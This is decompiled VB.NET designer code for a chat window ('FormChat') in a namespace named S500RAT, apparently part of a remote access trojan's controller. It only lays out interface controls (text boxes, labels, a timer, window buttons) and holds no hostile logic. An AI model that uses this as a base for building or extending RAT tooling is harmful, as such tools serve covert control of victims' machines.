Namespace S500RAT
	' Token: 0x02000012 RID: 18
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormChat
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000122 RID: 290 RVA: 0x00009A4C File Offset: 0x00007C4C
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000123 RID: 291 RVA: 0x00009A9C File Offset: 0x00007C9C
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.S500RAT.FormChat))
			Me.Timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.richTextBox1 = New Global.Sunny.UI.UIRichTextBox()
			Me.TextBox1 = New Global.Guna.UI2.WinForms.Guna2TextBox()
			Me.UiLabel1 = New Global.Sunny.UI.UILabel()
			Me.ClientInfo = New Global.System.Windows.Forms.Label()
			Me.Guna2ResizeBox2 = New Global.Guna.UI2.WinForms.Guna2ResizeBox()
			Me.PanelStart = New Global.System.Windows.Forms.Panel()
			Me.PictureBox1 = New Global.System.Windows.Forms.PictureBox()
			Me.NicnameText = New Global.Guna.UI2.WinForms.Guna2TextBox()
			Me.Guna2DragControl1 = New Global.Guna.UI2.WinForms.Guna2DragControl(Me.components)
			Me.Guna2BorderlessForm1 = New Global.Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
			Me.Mini = New Global.S500RAT.ValleyMini()
			Me.MAX = New Global.S500RAT.ValleyMax()
			Me.ExitForm = New Global.S500RAT.ValleyClose()
			Me.PanelStart.SuspendLayout()
			CType(Me.PictureBox1, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			MyBase.SuspendLayout()
			Me.Timer1.Interval = 2000
			Me.richTextBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.richTextBox1.AutoWordSelection = True
			Me.richTextBox1.BackColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.richTextBox1.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.richTextBox1.FillColor2 = Global.System.Drawing.SystemColors.WindowFrame
			Me.richTextBox1.FillDisableColor = Global.System.Drawing.Color.Red
			Me.richTextBox1.Font = New Global.System.Drawing.Font("Arial", 9F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.richTextBox1.ForeColor = Global.System.Drawing.Color.White
			Me.richTextBox1.ForeDisableColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.richTextBox1.Location = New Global.System.Drawing.Point(16, 74)
			Me.richTextBox1.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.richTextBox1.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.richTextBox1.Name = "richTextBox1"
			Me.richTextBox1.Padding = New Global.System.Windows.Forms.Padding(2)
			Me.richTextBox1.Radius = 8
			Me.richTextBox1.[ReadOnly] = True
			Me.richTextBox1.RectColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.richTextBox1.Size = New Global.System.Drawing.Size(506, 317)
			Me.richTextBox1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.richTextBox1.TabIndex = 480
			Me.richTextBox1.TextAlignment = Global.System.Drawing.ContentAlignment.MiddleCenter
			Me.richTextBox1.Visible = False
			Me.richTextBox1.WordWrap = True
			Me.TextBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.TextBox1.Animated = True
			Me.TextBox1.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.TextBox1.BorderColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.TextBox1.BorderRadius = 6
			Me.TextBox1.BorderStyle = Global.System.Drawing.Drawing2D.DashStyle.Custom
			Me.TextBox1.Cursor = Global.System.Windows.Forms.Cursors.IBeam
			Me.TextBox1.DefaultText = ""
			Me.TextBox1.DisabledState.BorderColor = Global.System.Drawing.Color.FromArgb(208, 208, 208)
			Me.TextBox1.DisabledState.FillColor = Global.System.Drawing.Color.FromArgb(226, 226, 226)
			Me.TextBox1.DisabledState.ForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.TextBox1.DisabledState.Parent = Me.TextBox1
			Me.TextBox1.DisabledState.PlaceholderForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.TextBox1.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.TextBox1.FocusedState.BorderColor = Global.System.Drawing.Color.FromArgb(82, 43, 255)
			Me.TextBox1.FocusedState.Parent = Me.TextBox1
			Me.TextBox1.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.TextBox1.ForeColor = Global.System.Drawing.Color.White
			Me.TextBox1.HoverState.BorderColor = Global.System.Drawing.Color.Magenta
			Me.TextBox1.HoverState.Parent = Me.TextBox1
			Me.TextBox1.IconRightCursor = Global.System.Windows.Forms.Cursors.Hand
			Me.TextBox1.Location = New Global.System.Drawing.Point(16, 398)
			Me.TextBox1.Margin = New Global.System.Windows.Forms.Padding(3, 2, 3, 2)
			Me.TextBox1.Name = "TextBox1"
			Me.TextBox1.PasswordChar = vbNullChar
			Me.TextBox1.PlaceholderForeColor = Global.System.Drawing.Color.Gray
			Me.TextBox1.PlaceholderText = "Message"
			Me.TextBox1.SelectedText = ""
			Me.TextBox1.ShadowDecoration.Parent = Me.TextBox1
			Me.TextBox1.Size = New Global.System.Drawing.Size(506, 28)
			Me.TextBox1.TabIndex = 481
			Me.TextBox1.TextAlign = Global.System.Windows.Forms.HorizontalAlignment.Center
			Me.TextBox1.Visible = False
			Me.UiLabel1.AutoSize = True
			Me.UiLabel1.BackColor = Global.System.Drawing.Color.Transparent
			Me.UiLabel1.Font = New Global.System.Drawing.Font("Microsoft YaHei", 9.75F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.UiLabel1.ForeColor = Global.System.Drawing.Color.White
			Me.UiLabel1.Location = New Global.System.Drawing.Point(12, 9)
			Me.UiLabel1.Name = "UiLabel1"
			Me.UiLabel1.Size = New Global.System.Drawing.Size(39, 19)
			Me.UiLabel1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.UiLabel1.TabIndex = 567
			Me.UiLabel1.Text = "Chat"
			Me.UiLabel1.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.ClientInfo.AutoSize = True
			Me.ClientInfo.BackColor = Global.System.Drawing.Color.Transparent
			Me.ClientInfo.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.ClientInfo.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.ClientInfo.Location = New Global.System.Drawing.Point(16, 30)
			Me.ClientInfo.Name = "ClientInfo"
			Me.ClientInfo.Size = New Global.System.Drawing.Size(15, 14)
			Me.ClientInfo.TabIndex = 568
			Me.ClientInfo.Text = "--"
			Me.Guna2ResizeBox2.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Guna2ResizeBox2.BackColor = Global.System.Drawing.Color.Transparent
			Me.Guna2ResizeBox2.FillColor = Global.System.Drawing.Color.Silver
			Me.Guna2ResizeBox2.ForeColor = Global.System.Drawing.Color.Empty
			Me.Guna2ResizeBox2.Location = New Global.System.Drawing.Point(508, 432)
			Me.Guna2ResizeBox2.Name = "Guna2ResizeBox2"
			Me.Guna2ResizeBox2.Size = New Global.System.Drawing.Size(20, 20)
			Me.Guna2ResizeBox2.TabIndex = 571
			Me.Guna2ResizeBox2.TargetControl = Me
			Me.Guna2ResizeBox2.UseTransparentBackground = True
			Me.PanelStart.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.PanelStart.Controls.Add(Me.PictureBox1)
			Me.PanelStart.Controls.Add(Me.NicnameText)
			Me.PanelStart.Location = New Global.System.Drawing.Point(16, 74)
			Me.PanelStart.Name = "PanelStart"
			Me.PanelStart.Size = New Global.System.Drawing.Size(506, 352)
			Me.PanelStart.TabIndex = 573
			Me.PictureBox1.Anchor = Global.System.Windows.Forms.AnchorStyles.None
			Me.PictureBox1.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.PictureBox1.Image = CType(componentResourceManager.GetObject("PictureBox1.Image"), Global.System.Drawing.Image)
			Me.PictureBox1.Location = New Global.System.Drawing.Point(203, 88)
			Me.PictureBox1.Name = "PictureBox1"
			Me.PictureBox1.Size = New Global.System.Drawing.Size(96, 96)
			Me.PictureBox1.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.Zoom
			Me.PictureBox1.TabIndex = 574
			Me.PictureBox1.TabStop = False
			Me.NicnameText.Anchor = Global.System.Windows.Forms.AnchorStyles.None
			Me.NicnameText.Animated = True
			Me.NicnameText.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.NicnameText.BorderColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.NicnameText.BorderRadius = 6
			Me.NicnameText.BorderStyle = Global.System.Drawing.Drawing2D.DashStyle.Custom
			Me.NicnameText.Cursor = Global.System.Windows.Forms.Cursors.IBeam
			Me.NicnameText.DefaultText = ""
			Me.NicnameText.DisabledState.BorderColor = Global.System.Drawing.Color.FromArgb(208, 208, 208)
			Me.NicnameText.DisabledState.FillColor = Global.System.Drawing.Color.FromArgb(226, 226, 226)
			Me.NicnameText.DisabledState.ForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.NicnameText.DisabledState.Parent = Me.NicnameText
			Me.NicnameText.DisabledState.PlaceholderForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.NicnameText.Enabled = False
			Me.NicnameText.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.NicnameText.FocusedState.BorderColor = Global.System.Drawing.Color.FromArgb(82, 43, 255)
			Me.NicnameText.FocusedState.Parent = Me.NicnameText
			Me.NicnameText.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.NicnameText.ForeColor = Global.System.Drawing.Color.White
			Me.NicnameText.HoverState.BorderColor = Global.System.Drawing.Color.Magenta
			Me.NicnameText.HoverState.Parent = Me.NicnameText
			Me.NicnameText.IconRightCursor = Global.System.Windows.Forms.Cursors.Hand
			Me.NicnameText.Location = New Global.System.Drawing.Point(97, 210)
			Me.NicnameText.Margin = New Global.System.Windows.Forms.Padding(3, 2, 3, 2)
			Me.NicnameText.Name = "NicnameText"
			Me.NicnameText.PasswordChar = vbNullChar
			Me.NicnameText.PlaceholderForeColor = Global.System.Drawing.Color.Gray
			Me.NicnameText.PlaceholderText = "Nickname"
			Me.NicnameText.SelectedText = ""
			Me.NicnameText.ShadowDecoration.Parent = Me.NicnameText
			Me.NicnameText.Size = New Global.System.Drawing.Size(306, 28)
			Me.NicnameText.TabIndex = 572
			Me.NicnameText.TextAlign = Global.System.Windows.Forms.HorizontalAlignment.Center
			Me.Guna2DragControl1.ContainerControl = Me
			Me.Guna2DragControl1.DockForm = True
			Me.Guna2DragControl1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2DragControl1.DragMode = Global.Guna.UI2.WinForms.Enums.DragMode.Control
			Me.Guna2DragControl1.DragStartTransparencyValue = 0.6
			Me.Guna2DragControl1.TargetControl = Me
			Me.Guna2DragControl1.TransparentWhileDrag = True
			Me.Guna2DragControl1.UseTransparentDrag = True
			Me.Guna2BorderlessForm1.AnimateWindow = True
			Me.Guna2BorderlessForm1.BorderRadius = 40
			Me.Guna2BorderlessForm1.ContainerControl = Me
			Me.Guna2BorderlessForm1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.DragStartTransparencyValue = 0.6
			Me.Guna2BorderlessForm1.ShadowColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.TransparentWhileDrag = True
			Me.Mini.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Mini.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Mini.Location = New Global.System.Drawing.Point(450, 12)
			Me.Mini.Name = "Mini"
			Me.Mini.Size = New Global.System.Drawing.Size(20, 20)
			Me.Mini.TabIndex = 580
			Me.Mini.Text = "ValleyMini1"
			Me.MAX.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.MAX.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MAX.Location = New Global.System.Drawing.Point(476, 12)
			Me.MAX.Name = "MAX"
			Me.MAX.Size = New Global.System.Drawing.Size(20, 20)
			Me.MAX.TabIndex = 579
			Me.MAX.Text = "ValleyMax1"
			Me.ExitForm.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ExitForm.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.ExitForm.Location = New Global.System.Drawing.Point(502, 12)
			Me.ExitForm.Name = "ExitForm"
			Me.ExitForm.Size = New Global.System.Drawing.Size(20, 20)
			Me.ExitForm.TabIndex = 578
			Me.ExitForm.Text = "ValleyClose1"
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(96F, 96F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Dpi
			Me.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			MyBase.ClientSize = New Global.System.Drawing.Size(540, 464)
			MyBase.Controls.Add(Me.Mini)
			MyBase.Controls.Add(Me.MAX)
			MyBase.Controls.Add(Me.ExitForm)
			MyBase.Controls.Add(Me.PanelStart)
			MyBase.Controls.Add(Me.Guna2ResizeBox2)
			MyBase.Controls.Add(Me.UiLabel1)
			MyBase.Controls.Add(Me.ClientInfo)
			MyBase.Controls.Add(Me.richTextBox1)
			MyBase.Controls.Add(Me.TextBox1)
			Me.Font = New Global.System.Drawing.Font("Microsoft Sans Serif", 8.25F)
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.Name = "FormChat"
			Me.Text = "FormChat"
			MyBase.TopMost = True
			Me.PanelStart.ResumeLayout(False)
			CType(Me.PictureBox1, Global.System.ComponentModel.ISupportInitialize).EndInit()
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x04000085 RID: 133
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
